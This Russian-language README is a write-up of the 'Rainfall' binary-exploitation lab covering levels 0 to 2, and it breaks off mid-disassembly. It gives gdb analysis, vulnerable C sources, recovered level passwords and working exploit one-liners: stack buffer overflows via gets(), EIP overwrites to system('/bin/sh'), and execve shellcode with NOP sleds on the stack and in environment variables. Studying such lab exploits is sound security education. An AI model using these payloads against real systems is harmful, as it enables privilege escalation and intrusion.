<!-- <style>
  .filePath {
  background: red;
  color: white;
  }
  .off {
  color: red;
  }
  .on {
  color: green;
  }
</style> -->

# Rainfall
Проект по изучению методов взлома и поиску уязвимостей.

На платформе intra на странице проекта есть образ, который необходимо запустить на виртуальной машине и получить пароли от пользователей     \
level0 level1 level2 level3 level4     \
level5 level6 level7 level8 level9     \
bonu0 bonu1 bonu02 bonu3 end

Скрипт для запуска образа в VirtualBox: [Vbox/setup.sh](./Vbox/setup.sh) .

Полученные пароли записаны в файлы: \
[levelX](./project)/flag,           \
[bonusX](./project)/flag,           \
где X - номер уровня, на котором получен пароль.

Ниже последовательно описаны мои действия по достижению цели.

<a name="content"></a> 
# Содержание и список полученных паролей от следующего пользователя

[Вступительная теория о списке состояния механизмов защиты ядра](#Preamble)

| Пользователь           | Уязвимость | Инструмент | Пароль от следующего пользователя  |  
| ---------------------- | ---------- | -----------| ----------------------:|
| ........................... | ........................... | .................................................................................|........................................................................................................................ |
| [level0](#lvl0)        | Выявление с помощью gdb подходящего числа для ввода | gdb |  1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a |
| [level1](#lvl1)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>использование функции gets(), наличие в коде функции system() </p> | <p>Работа со стеком. </p> <br> <p>поиск слабого места: gdb;</p> <p>взлом: переполнение буфера ( `gets()` ) и подмена EIP регистра (адрес возврата из функции) на адрес с нужным кодом: <br> - [адрес на system()](#level1_jump_to_system()), <br> - [положить шеллкод на стек и положить в EIP адрес шеллкода на стеке](#level1_shellcode_on_stack), <br> - [положить шеллкод в переменную окружения и положить в EIP адрес этой переменной окружения](#level1_shellcode_in_env) </p>| 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77 |
| [level2](#lvl2)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>использование функции gets(), выделение памяти в куче без освобождения strdup() </p>  | <p>Работа с кучей. </p> <br> Поиск слабого места: gdb; <br>Поиск адреса кучи: ltrace, gdb<br><br>Взлом: переполнение буфера ( gets() ) и подмена EIP регистра (адрес возврата из функции) на адрес кучи. | 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02 |
| [level3](#lvl3)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>уязвимость строки форматирования: уязвимое использование функции printf()<br><br> наличие в коде функции system() | gdb |  |
| [level4](#lvl4)        |  |  |  |
| [level5](#lvl5)        |  |  |  |
| [level6](#lvl6)        |  |  |  |
| [level7](#lvl7)        |  |  |  |
| [level8](#lvl8)        |  |  |  |
| [level9](#lvl9)        |  |  |  |
| [bonus0](#bonus0)      |  |  |  |
| [bonus1](#bonus1)      |  |  |  |
| [bonus2](#bonus2)      |  |  |  |
| [bonus3](#bonus3)      |  |  |  |

#
###### [вернуться к содержанию](#content)
<a name="Preamble"></a> 
# Вступительная теория о списке состояния механизмов защиты ядра

После запуска ВМ при входе в пользователя появляется сообщение:
<!-- <pre>
_____       _       ______    _ _
|  __ \     (_)     |  ____|  | | |
| |__) |__ _ _ _ __ | |__ __ _| | |
|  _  /  _` | | '_ \|  __/ _` | | |
| | \ \ (_| | | | | | | | (_| | | |
|_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

Good luck & Have fun

To start, ssh with level0/level0 on :4242
    level0@10.21.33.24's password:
    GCC stack protector support:            <font class=on>Enabled</font>
    Strict user copy checks:                <font class=off>Disabled</font>
    Restrict /dev/mem access:               <font class=on>Enabled</font>
    Restrict /dev/kmem access:              <font class=on>Enabled</font>
    grsecurity / PaX: <font class=off>No GRKERNSEC</font>
    Kernel Heap Hardening: <font class=off>No KERNHEAP</font>
    System-wide ASLR (kernel.randomize_va_space): <font class=off>Off (Setting: 0)</font>
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    <font class=off>No RELRO        No canary found   <font class=on>NX enabled</font>    No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/level0/level0</font>
</pre> -->
![level0](./README/level0.png)

Это список состояния механизмов защиты ядра.

Чтобы повторно посмотреть этот вывод, можно вызвать 3 команды:
```sh
checksec --kernel
cat /proc/sys/kernel/randomize_va_space
checksec --file /home/user/level0/level0
```
Хорошие статьи о checksec и randomize_va_space:
1. [о checksec --kernel](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/),    
2. [о checksec --file и не только. RELPO, CANARY, NX, PIE](https://opensource.com/article/21/6/linux-checksec)     
3. [о kernel.randomize_va_space (ASLR)](https://www.spec.org/cpu2017/flags/Supermicro-Platform-Settings-V1.2-Milan-revC.html) 
4. [/proc/sys/kernel/randomize_va_space](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt)
5. [kernel.randomize_va_space (ASLR)](https://www.spec.org/cpu2017/flags/Supermicro-Platform-Settings-V1.2-Milan-revC.html)

Еще кое-что для чтения о взломах
1. [Переполнение буфера: анатомия эксплоита](https://www.securitylab.ru/analytics/421994.php)
2. [Off-By-One Vulnerability (Heap Based)](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/)
3. [Уязвимость Use-After-Free](https://habr.com/ru/company/otus/blog/516150/)

<details> 
  <summary> Некоторые рассуждения о прочитанном </summary>
    <ol>
      <li> 
          <p>
            Можно в определенных ситуациях воспользоваться перезаписью данных в переменную (перезаписать данные за пределами переменной):
          </p>
        <pre> Strict user copy checks:                <font class=off>Disabled</font></pre>
      </li>
      <li>
          <p>
          Можно попробовать вычислить нужный адрес процесса:
          </p>
        <pre> System-wide ASLR (kernel.randomize_va_space): <font class=off>Off (Setting: 0)</font></pre>
          <p>
            "Этот параметр можно использовать для выбора типа рандомизации адресного пространства процесса. Значения по умолчанию различаются в зависимости от того, поддерживает ли архитектура ASLR, было ли ядро собрано с параметром CONFIG_COMPAT_BRK или нет, или от используемых параметров загрузки ядра.
          </p>
          <ul>
            Возможные настройки:
            <li>0: отключить рандомизацию адресного пространства процесса.</li>
            <li>1: Рандомизировать адреса базы mmap, стека и страниц VDSO.</li>
            <li>2: дополнительно рандомизируйте кучу. (Вероятно, это значение по умолчанию.)</li>
          </ul>
          <a href="https://www.spec.org/cpu2017/flags/Supermicro-Platform-Settings-V1.2-Milan-revC.html">
            "Отключение ASLR может сделать выполнение процессов более детерминированным, а время выполнения — более согласованным."
          </a>
      </li>
      <li>
        grsecurity / PaX: Custom GRKERNSEC
        <pre>
Non-executable kernel pages:            <font class=on>Enabled</font> / <font class=off>Disabled</font>
Prevent userspace pointer deref:        <font class=on>Enabled</font> / <font class=off>Disabled</font>
Prevent kobject refcount overflow:      <font class=on>Enabled</font> / <font class=off>Disabled</font>
Bounds check heap object copies:        <font class=on>Enabled</font> / <font class=off>Disabled</font>
Disable writing to kmem/mem/port:       <font class=on>Enabled</font> / <font class=off>Disabled</font>
Disable privileged I/O:                 <font class=on>Enabled</font> / <font class=off>Disabled</font>
Harden module auto-loading:             <font class=on>Enabled</font> / <font class=off>Disabled</font>
Hide kernel symbols:                    <font class=on>Enabled</font> / <font class=off>Disabled</font>
        </pre>
        Поскольку No GRKERNSEC, то всё вышеописанное отключено.
        <p>
          <a href="https://blog.siphos.be/2011/07/checksec-kernel-security/"> Подробнее об этих параметрах</a>
        </p>
        <p>
          <a href="https://www.opennet.ru/cgi-bin/opennet/man.cgi?topic=iopl&category=2"> ioperm и iopl </a>
        </p>
      </li>
    </ol>
</details>

#
###### [вернуться к содержанию](#content)
<a name="lvl0"></a> 
# level0

1. Проверяю содержимое директории и пробую запустить найденный файл различными способами:
```sh
ls -la
# ||
# \/
# -rwsr-x---+ 1 level1 users  747441 Mar  6  2016 level0

./level0
# ||
# \/
# Segmentation fault (core dumped)

ldd ./level0
# ||
# \/
# not a dynamic executable
```
Ссылки для чтения:
* [о чем говорит вывод `not a dynamic executable`](https://stackoverflow.com/questions/26541049/ltrace-couldnt-find-dynsym-or-dynstr-in-library-so) \
* [Как работает ltrace (инструмент трассировки библиотек)](https://stackoverflow.com/questions/32214079/how-does-ltrace-library-tracing-tool-work) \
* [внутреннее устройство ltrace](https://www.kernel.org/doc/ols/2007/ols2007v1-pages-41-52.pdf)

```sh
./level0 -1
# ||
# \/
# No !

gdb ./level0
(gdb) disas main
# ||
# \/
   0x08048ecc <+12>:	add    $0x4,%eax
   0x08048ecf <+15>:	mov    (%eax),%eax
   0x08048ed1 <+17>:	mov    %eax,(%esp)
   0x08048ed4 <+20>:	call   0x8049710 <atoi>
   0x08048ed9 <+25>:	cmp    $0x1a7,%eax
   0x08048ede <+30>:	jne    0x8048f58 <main+152>
```
Эти строки говорят о том, что при запуске ./level0 с аргументом, аргумент будет переведен в число и сравнен со значением 0x1a7<sub>16</sub> = 423<sub>10</sub>. При совпадении значений, будет произведен прыжок на 0x8048f58 <main+152> . 

2. Пробую 423 в качестве эксплоита:

```sh
./level0 423
$ cat /home/user/level1/.pass
# ||
# \/
# 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
$ exit
level0@RainFall:~$ su level1
# Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```
<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>
#include "string.h"
#include "unistd.h"
#include "stdio.h"
<br>
int    main(int argc, char **argv){
        gid_t           gid;
        uid_t           uid;
        char            *array[2];


        if (atoi(argv[1]) == 423){
                array[0] = strdup("/bin/sh");
                array[1] = NULL;
                gid = getegid();
                uid = geteuid();
                setresgid(gid, gid, gid);
                setresuid(uid, uid, uid);
                execv("/bin/sh", array);
        }
        else
                fprintf(stderr, "No !\n");
        return (0);
}
</pre>
gcc -static -m32 -Wl,-z,norelro -fno-stack-protector исходник_level0.c -o level0
<br><br><br>
</details> 

#
###### [вернуться к содержанию](#content)
<a name="lvl1"></a> 
# level1

<!-- <pre>
level0@RainFall:~$ su level1
<font color=grey>Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a</font>

RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
<font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/level1/level1</font>
</pre> -->
![level1](./README/level1.png)

...................... \
RELRO: [защищает структуры исполняемого ELF-файла (изменение которых позволяет взломщику изменить ход выполнения программы) путем модификации секций PLT (Procedure Linking Table) или GOT (Global Offset Table) ELF-файла. При полном RELRO, вся таблица GOT перед началом исполнения в памяти помечается доступной только для чтения и таким образом предотвращает свою модификацию потенциальным злоумышленником.](https://www.opennet.ru/opennews/art.shtml?num=27938) Значит, что в этом случае можно "на ходу" поменять выполнение программы.

...................... \
No canary found - значит можно переполнить буфер и положить нужные нам значения для возврата из функции.

...................... \
No PIE - отключена рандомизация адресного пространства.

...................... \
NX: в полученном выводе видно, что NX выключено, значит, можно при запуске level1 поместить в стек исполняемый код и запустить его. Именно этим ниже я и воспользуюсь.

...................... \
исполняемый файл будет всегда запускаться от имени владельца - это level2:
```sh
ls -la
# ||
# \/
# -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1

getfacl level1 
# ||
# \/
# # file: level1
# # owner: level2
# # group: users
# # flags: ss-
# user::rwx
# user:level2:r-x
# user:level1:r-x
# group::---
# mask::r-x
# other::---
```
Значит, с помощью этой программы можно получить доступ к файлам, на которые есть права у level2.

...................... 

1. Проверяю содержимое директории и пробую запустить найденный файл различными способами:
```sh
ls -la
# ||
# \/
# -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1

./level1
# ||
# \/
# maybe loop or waiting for something...or something else

ltrace ./level1
# ||
# \/
# __libc_start_main(0x8048480, 1, 0xbffff7b4, 0x80484a0, 0x8048510 <unfinished ...>
# gets(0xbffff6d0, 47, 0xbffff71c, 0xb7fd0ff4, 0x80484a0
# )                           = 0xbffff6d0
# +++ exited (status 208) +++

```
2. Использование уязвимости:
NX disabled + No canary found + NO PIE + gets(), в которую подан аргумент при вызове программы.

Статьи по уровню:   
 - [О работе стека.](https://www.opennet.ru/base/dev/stack_intro.txt.html)    
 - [В королевстве PWN. Препарируем классику переполнения стека](https://snovvcrash.rocks/2019/10/20/classic-stack-overflow.html#gdb-peda)    
 - [Создание Эксплойта: Переполнение буфера стека](https://codeby.net/threads/sozdanie-ehksplojta-perepolnenie-bufera-steka.58741/)

gets() не проверяет длину поданной строки. И в этом уязвимость функции - можно переполнить буфер и положить вредоносный код (эксплоит) - 
1. [переместиться на system()](#level1_jump_to_system())
2. [положить шеллкод на стек и переместиться на адрес шеллкода на стеке](#level1_shellcode_on_stack)
3. [положить шеллкод в переменную окружения и переместиться на адрес переменной окружения](#level1_shellcode_in_env)

Общее для всех трех способов взлома - подмена адреса возврата функции (регистр EIP). Подробно об этом ниже.

```sh
gdb -batch -ex 'file ./level1' -ex 'disas main'
# ||
# \/
# Dump of assembler code for function main:
#    0x08048480 <+0>:     push   %ebp
#    0x08048481 <+1>:     mov    %esp,%ebp
#    0x08048483 <+3>:     and    $0xfffffff0,%esp
#    0x08048486 <+6>:     sub    $0x50,%esp
#    0x08048489 <+9>:     lea    0x10(%esp),%eax
#    0x0804848d <+13>:    mov    %eax,(%esp)
#    0x08048490 <+16>:    call   0x8048340 <gets@plt>
#    0x08048495 <+21>:    leave  
#    0x08048496 <+22>:    ret    
# End of assembler dump.
```
<details> 
  <summary> Анализ disassemble main в развороте: </summary>
<br>

создается стековый фрейм (stack frame) или кадр стека: <br>
`0x08048480 <+0>:     push   %ebp` сохраняет в стеке содержимое регистра EBP <br>
`0x08048481 <+1>:     mov    %esp,%ebp` присваивает регистру
EBP значение ESP <br>
`0x08048483 <+3>:     and    $0xfffffff0,%esp` выравнивание стека по 16-байтовой границе, то есть каждая созданная переменная и выделенная в функции main область памяти будет выравниваться до размера, кратного 16 байтам.

Далее: <br>
`0x08048486 <+6>:     sub    $0x50,%esp` резерв места для локальных переменных функции main 50<sub>16</sub> = 80<sub>10</sub> байт - содержит:<br> 
возвращенное значение от `char* gets()`, то есть `char*` - 4 байта, выровненные до 16 ([Соглашение о вызове функций - выравнивание стека](https://www.cyberforum.ru/assembler-x64/thread1328915.html)) <br>
создание буфера под 80-16=64 байта

Приготовления для вызова функции gets(): <br>
`0x08048489 <+9>:     lea    0x10(%esp),%eax` в eax помещается значение `esp+10` [(без разименования)](https://stackoverflow.com/questions/1658294/whats-the-purpose-of-the-lea-instruction), то есть адрес на буфер в 50<sub>16</sub>-10<sub>16</sub>=40<sub>16</sub> = 64<sub>10</sub> байта (как я писала выше, 10<sub>16</sub> = 16<sub>10</sub> байт - это возвращаемое значение функцией gets(), то есть просто esp указывал бы как раз на это возвращаемое значение). <br>
`0x0804848d <+13>:    mov    %eax,(%esp)` в gets() передается указатель на буфер в 40<sub>16</sub> = 64<sub>10</sub> байта. <br>
`0x08048490 <+16>:    call   0x8048340 <gets@plt>` вызов gets()

Последнее:
`0x08048495 <+21>:    leave  ` <br>
Инструкция leave равносильна двум инструкциям <br>
1: `mov esp,ebp` вершина стека указывает на значение, которое занимала перед входом в функцию main <br>
2: `pop ebp` ebp опять принимает значение ebp вызывающей функции. <br>
`0x08048496 <+22>:    ret    `
инструкция ret верхнее значение стека присваивает регистру eip, [предполагая, что это сохраненный адрес возврата в вызывающую функцию, переходит по этому адресу](https://snovvcrash.rocks/2019/10/20/classic-stack-overflow.html).
<br><br><br>
</details>

<details> 
  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
<pre>
#include "stdlib.h"
#include "unistd.h"
#include "stdio.h"
#include "string.h"
#include "sys/types.h"
#include "sys/wait.h"
<br>
void  run(void) {
        fprintf(stdout, "Good... Wait what?\n");
        system("/bin/sh");
}<br>
int   main(int argc, char **argv) {
        char buffer[64];
        gets(buffer);
}
</pre>
gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level1.c -o level1
</details> 

Интересующая строка: \
`0x08048496 <+22>:    ret  ` инструкция ret верхнее значение стека присваивает регистру eip. \
В соответствии с анализом, приведенным выше, надо переполнить буфер и подать нужный адрес на место, где в стеке размещался бы регистр eip. Ниже это я рассмотрю.

## Разработка эксплоита. 

## Общее для всех трех способов  - перемещение на функцию, исполнение шеллкода на стеке, исполнение шеллкода из переменной окружения:
Расчет смещения EIP (адреса возврата) \
[Воспользуюсь сайтом.](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
![Получается так:](./README/level1_buf_overflow.png)
Нужное смещение 76 байт.

Теперь необходимо решить, на что будет указывать адрес, который будет положен в EIP.


<a name="level1_jump_to_system()"></a> 
## _1._ level1: перейти на system()

Поиск места для подмены адреса возврата:

```sh

gdb

disassemble TAB
# || 
# \/
# gets
# main
# run
# system
# fwrite
# data_start
# frame_dummy
# ...
```

Среди функций есть system().
Если перейти сразу на system(), то оболочка не откроется, так как для открытия оболочки этой функции необходим аргумент `/bin/sh`. Для вызова system() с нужным аргументом нахожу функцию, которая ее вызывает (в main не было такой). Нахожу в run:
```sh
gdb -batch -ex 'file ./level1' -ex 'disassemble run' | grep system
# || 
# \/
#  0x08048479 <+53>:    call   0x8048360 <system@plt>
```
Отлично. Это то, что нужно. \
`0x08048472 <+46>:    movl   $0x8048584,(%esp)` кладет `/bin/sh` в аргумент для system() \
`0x08048479 <+53>:    call   0x8048360 <system@plt>` вызов system() c `/bin/sh`

Посмотреть содержимое переменной: 
```
(gdb) x 0x8048584
0x8048584:       "/bin/sh"
```
Теперь нужно подать вместо адреса возврата в main адрес `0x08048472 <+46>:    movl   $0x8048584,(%esp)`, либо любой, после которого я попадаю на эту строку внутри run():
```sh
gdb
(gdb) disassemble run
# || 
# \/
# Dump of assembler code for function run:
#    0x08048444 <+0>:     push   %ebp
#    0x08048445 <+1>:     mov    %esp,%ebp
#    0x08048447 <+3>:     sub    $0x18,%esp
#    0x0804844a <+6>:     mov    0x80497c0,%eax
#    0x0804844f <+11>:    mov    %eax,%edx
#    0x08048451 <+13>:    mov    $0x8048570,%eax
#    0x08048456 <+18>:    mov    %edx,0xc(%esp)
#    0x0804845a <+22>:    movl   $0x13,0x8(%esp)
#    0x08048462 <+30>:    movl   $0x1,0x4(%esp)
#    0x0804846a <+38>:    mov    %eax,(%esp)
#    0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
#    0x08048472 <+46>:    movl   $0x8048584,(%esp)
#    0x08048479 <+53>:    call   0x8048360 <system@plt>
#    0x0804847e <+58>:    leave  
#    0x0804847f <+59>:    ret    
# End of assembler dump.
```
Таким образом подойдет любой из этих:
0x08048444 \
0x08048445 \
0x08048447 \
0x0804844a \
0x0804844f \
0x08048451 \
0x08048456 \
0x0804845a \
0x08048462 \
0x0804846a \
0x0804846d \
0x08048472 

Я возьму сразу 0x08048472 на строку выше, чем system(): 
```sh
#                                       0x08048472
(echo $(python -c 'print "a" * 76 + "\x72\x84\x04\x08"'); cat) | ./level1
whoami
# || 
# \/
# level2
cat /home/user/level2/.pass
# || 
# \/
# 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
Уровень пройден!
```sh
su level2
# Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

<a name="level1_shellcode_on_stack"></a> 
## _2._ level1: shellcode на стеке

Для shellcodes мне понравился сайт http://shell-storm.org/ . \
На нем есть масса полезных статей по кибербезопасности и [готовые shellcodes](http://shell-storm.org/shellcode/index.html).

<a name="shellcode"></a> 
<details> 
  <summary> Чтобы подобрать подходящий код, я проделала шаги, указанные в развороте: </summary>

1. Узнаю ОС:
```sh
uname -a
# ||
# \/
# Linux RainFall 3.2.0-90-generic-pae #128-Ubuntu SMP Fri Aug 14 22:16:51 UTC 2015 i686 i686 i386 GNU/Linux
```
В данном случае 32-разрядная ОС.

2. Теперь надо узнать информацию об архитектуре CPU:

```sh
lscpu
# ||
# \/
# Architecture:          i686
# CPU op-mode(s):        32-bit, 64-bit
# Byte Order:            Little Endian
# CPU(s):                1
# On-line CPU(s) list:   0
# Thread(s) per core:    1
# Core(s) per socket:    1
# Socket(s):             1
# Vendor ID:             GenuineIntel
# CPU family:            6
# Model:                 55
# Stepping:              8
# CPU MHz:               2163.246
# BogoMIPS:              4326.49
# Virtualization:        VT-x
# L1d cache:             24K
# L1i cache:             32K
# L2 cache:              1024K
```
Значит, мне нужен код для:  \
Linux 32-bit                \
Intel/x86                   \
Этот код будет содержать execve() - запуск оболочки. <br>
<br>
Я выбрала:                  \
`||`                        \
`\/`                        \
Intel x86                   \
Sauder                      \
Linux/x86 - execve() Diassembly Obfuscation Shellcode - 32 bytes by BaCkSpAcE
<br><br><br>
</details> 

Узнаю количесвто символов на стеке после буфера, которое я могу безопасно использовать для своих целей:
```sh
python -c 'print "A"*76 + "B" * 4 + "C" * 72'
# ||
# \/
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

gdb level1

(gdb)r $(python -c 'print "A"*76 + "B" * 4 + "C" * 72')
# ||
# \/
# Program received signal SIGSEGV, Segmentation fault.
# 0x42424242 in ?? ()

(gdb) x/64xw $esp-80
# ||
# \/
# 0xbffff5f0:     0x41414141      0x41414141      0x41414141      0x41414141
# 0xbffff600:     0x41414141      0x41414141      0x41414141      0x41414141
# 0xbffff610:     0x41414141      0x41414141      0x41414141      0x41414141
# 0xbffff620:     0x41414141      0x41414141      0x41414141      0x41414141
# 0xbffff630:     0x41414141      0x41414141      0x41414141      0x42424242
# 0xbffff640:     0x43434343      0x43434343      0x43434343      0x43434343
# 0xbffff650:     0x43434343      0x43434343      0x43434343      0x43434343
# 0xbffff660:     0x43434343      0x43434343      0x43434343      0x43434343
# 0xbffff670:     0x43434343      0x43434343      0x43434343      0x43434343
# 0xbffff680:     0x43434343      0x43434343      0x00000000      0x08048390
# 0xbffff690:     0x00000000      0xb7ff26b0      0xb7e453e9      0xb7ffeff4
# 0xbffff6a0:     0x00000001      0x08048390      0x00000000      0x080483b1
# 0xbffff6b0:     0x08048480      0x00000001      0xbffff6d4      0x080484a0
# 0xbffff6c0:     0x08048510      0xb7fed280      0xbffff6cc      0xb7fff918
# 0xbffff6d0:     0x00000001      0xbffff819      0x00000000      0xbffff832
# 0xbffff6e0:     0xbffff847      0xbffff85e      0xbffff876      0xbffff886

```
`C` выровнены начиная с адреса `0xbffff640` - это именно то место, куда будет положен shellcode и NOP-срезы.

Запуск в дебаггере  кода с выводом от команды \
`(python -c 'print "A"*76 + "\x40\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"')` \
отработает, но оболочка откроется с правами пользователя, запустившего бинарник. Это особенность дебаггера в целях безопасности.

За пределами дебаггера выполняю команду: \
`(python -c 'print "A"*76 + "\x40\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; cat) | ./level1 ` \
и оболочка не открывается, потому что я не попадаю на шелл код. Это связано с тем, что при запуске в дебаггере и без него адреса немного отличаются (разные переменные окружения, которые кладутся перед кодом программы).

Подбираю правильный адрес (подошел на 16*3 байт больше), чтобы попасть на NOP-срез и проскользить до shellcode:
```sh
(python -c 'print "A"*76 + "\x70\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; cat) | ./level1 
        whoami
        level2
        cat /home/user/level2/.pass
        53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

```
Уровень пройден!
```sh
su level2
# Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

<a name="level1_shellcode_in_env"></a> 
## _3._ level1: shellcode в env

В [level1: shellcode на стеке](#level1_shellcode_on_stack) я рассматривала, как подобрать подходящий [shellcode](#shellcode). Воспользуюсь здесь тем же кодом.

Создаю переменную окружения:
```sh
export SHELLCODE=$'\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'
```
Компилирую и запускаю файл (env_addr.c) в папке /tmp/:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
        printf("%p\n", getenv("SHELLCODE"));
        return 0;
}
```
```sh
gcc /tmp/env_addr.c -o /tmp/env_addr
level2@RainFall:~$ /tmp/env_addr
# ||
# \/
# 0xbffff868
#     |_____________________________
#                                  ||
#                                 \  /
#                                  \/
#                             0xbffff868
(python -c 'print "A"*76 + "\x68\xf8\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; echo "cat /home/user/level2/.pass") | ./level1 
# ||
# \/
# 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
Уровень пройден!
```sh
su level2
# Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

#
###### [вернуться к содержанию](#content)
<a name="lvl2"></a> 
# level2

<!-- <pre>
level0@RainFall:~$ su level2
<font color=grey>Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77</font>

RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
<font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/level2/level2</font>
</pre> -->
![level2](./README/level2.png)

```sh
ls -la
# ||
# \/
# -rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2

getfacl level2 
# ||
# \/
# # file: level2
# # owner: level3
# # group: users
# # flags: ss-
# user::rwx
# user:level2:r-x
# user:level3:r-x
# group::---
# mask::r-x
# other::---

./level2 
# ||
# \/
# 
# 
./level2 
# ||
# \/
# sdgsdg
# sdgsdg

ltrace ./level2 
# ||
# \/
# __libc_start_main(0x804853f, 1, 0xbffff6f4, 0x8048550, 0x80485c0 <unfinished ...>
# fflush(0xb7fd1a20)                                                             = 0
# gets(0xbffff5fc, 0, 0, 0xb7e5ec73, 0x80482b5 12345678Hello
# )                                  = 0xbffff5fc
# puts(" 12345678Hello" 12345678Hello
# )                                                         = 15
# strdup(" 12345678Hello")                                                       = 0x0804a008
# +++ exited (status 8) +++
```
Из вывода `ltrace` видно, что используются: \
`gets()` - можно переполнить буфер,         \
`strdup()` - в программе выделяется куча (heap), в ней же как и на стеке можно расположить исполняемый код.

```sh
(gdb) disassemble Tab
# ||
# \/
# main p printf puts fflush strdup gets
# ...

(gdb) disassemble main
# ||
# \/
# Dump of assembler code for function main:
#    0x0804853f <+0>:     push   %ebp
#    0x08048540 <+1>:     mov    %esp,%ebp
#    0x08048542 <+3>:     and    $0xfffffff0,%esp
#    0x08048545 <+6>:     call   0x80484d4 <p>
#    0x0804854a <+11>:    leave  
#    0x0804854b <+12>:    ret    
# End of assembler dump.
```
main вызывает только p()

```sh
(gdb) disassemble p
# ||
# \/
# Dump of assembler code for function p:
#    0x080484d4 <+0>:     push   %ebp
#    0x080484d5 <+1>:     mov    %esp,%ebp
#    0x080484d7 <+3>:     sub    $0x68,%esp
#    0x080484da <+6>:     mov    0x8049860,%eax
#    0x080484df <+11>:    mov    %eax,(%esp)
#    0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
#    0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
#    0x080484ea <+22>:    mov    %eax,(%esp)
#    0x080484ed <+25>:    call   0x80483c0 <gets@plt>
#    0x080484f2 <+30>:    mov    0x4(%ebp),%eax
#    0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
#    0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
#    0x080484fb <+39>:    and    $0xb0000000,%eax
#    0x08048500 <+44>:    cmp    $0xb0000000,%eax
#    0x08048505 <+49>:    jne    0x8048527 <p+83>
#    0x08048507 <+51>:    mov    $0x8048620,%eax
#    0x0804850c <+56>:    mov    -0xc(%ebp),%edx
#    0x0804850f <+59>:    mov    %edx,0x4(%esp)
#    0x08048513 <+63>:    mov    %eax,(%esp)
#    0x08048516 <+66>:    call   0x80483a0 <printf@plt>
#    0x0804851b <+71>:    movl   $0x1,(%esp)
#    0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
#    0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
#    0x0804852a <+86>:    mov    %eax,(%esp)
#    0x0804852d <+89>:    call   0x80483f0 <puts@plt>
#    0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
#    0x08048535 <+97>:    mov    %eax,(%esp)
